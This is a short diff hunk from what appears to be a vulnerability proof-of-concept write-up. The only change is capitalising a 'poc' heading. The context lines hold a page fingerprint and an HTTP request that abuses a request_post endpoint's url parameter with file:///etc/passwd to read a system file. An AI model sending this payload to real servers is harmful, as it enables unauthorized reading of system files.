@@ -8,7 +8,7 @@
 body="/assets/index/css/mobileSelect.css"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /api/index/request_post?url=file:///etc/passwd&post_data=1 HTTP/1.1
